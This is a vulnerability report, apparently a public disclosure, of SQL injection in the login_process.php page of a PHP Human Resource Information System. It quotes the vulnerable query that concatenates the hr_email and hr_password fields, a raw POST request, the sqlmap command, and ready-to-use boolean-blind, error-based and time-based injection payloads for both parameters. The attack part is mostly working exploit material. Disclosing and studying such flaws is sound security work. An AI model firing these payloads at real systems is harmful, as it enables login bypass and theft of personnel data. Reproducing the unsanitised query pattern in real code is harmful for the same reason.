#### BUG_AUTHOR:LIU WEIYU
## Human Resource Information System - SQL Injection on (initialize/login_process.php hr_email/hr_password parameter) 
### Vendor Homepage:
https://www.sourcecodester.com/php/14714/human-resource-information-using-phpmysqliobject-orientedcomplete-free-sourcecode.html 
### Version:V1.0
### Tested on: PHP, Apache, MySQL
### Affected Page:
initialize/login_process.php 

On this page, hr_email and hr_password parameters are vulnerable to SQL Injection Attack 
### Source Code(initialize/login_process.php):
```
$hr_email = $_POST['hr_email'];
$hr_password   = $_POST['hr_password'];
$hr_type  = $_POST['hr_type'];
$query  = $phdb->query("SELECT * FROM hr_member WHERE hr_email='$hr_email' AND hr_password='$hr_password' AND hr_type='HR Head'");
Proof of vulnerability(Verify using the sqlmap tool):
Requests:
POST /Human%20Resource%20Information%20System%202020/initialize/login_process.php HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Content-Length: 98
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Language: zh-CN,zh;q=0.9
Cache-Control: max-age=0
Content-Type: application/x-www-form-urlencoded
Origin: http://localhost
Referer: http://localhost/Human%20Resource%20Information%20System%202020/
Upgrade-Insecure-Requests: 1
Accept-Encoding: gzip

hr_email=1&hr_password=1&hr_type=HR+Head&login_hr=
```
#### -> sqlmap -r 1.txt(above request package) --batch
### Output:
```
---
Parameter: hr_email (POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)
    Payload: hr_email=1' OR NOT 4510=4510#&hr_password=1&hr_type=HR Head&login_hr=

    Type: error-based
    Title: MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: hr_email=1' OR (SELECT 5663 FROM(SELECT COUNT(*),CONCAT(0x716b717071,(SELECT (ELT(5663=5663,1))),0x71786b7871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- FySz&hr_password=1&hr_type=HR Head&login_hr=

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: hr_email=1' AND (SELECT 9216 FROM (SELECT(SLEEP(5)))UyGW)-- ctYN&hr_password=1&hr_type=HR Head&login_hr=
---
---
Parameter: hr_password (POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)
    Payload: hr_email=1&hr_password=1' OR NOT 2899=2899#&hr_type=HR Head&login_hr=

    Type: error-based
    Title: MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: hr_email=1&hr_password=1' OR (SELECT 9783 FROM(SELECT COUNT(*),CONCAT(0x716b717071,(SELECT (ELT(9783=9783,1))),0x71786b7871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- tukX&hr_type=HR Head&login_hr=

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: hr_email=1&hr_password=1' AND (SELECT 3525 FROM (SELECT(SLEEP(5)))QLMt)-- HCvR&hr_type=HR Head&login_hr=
---
```

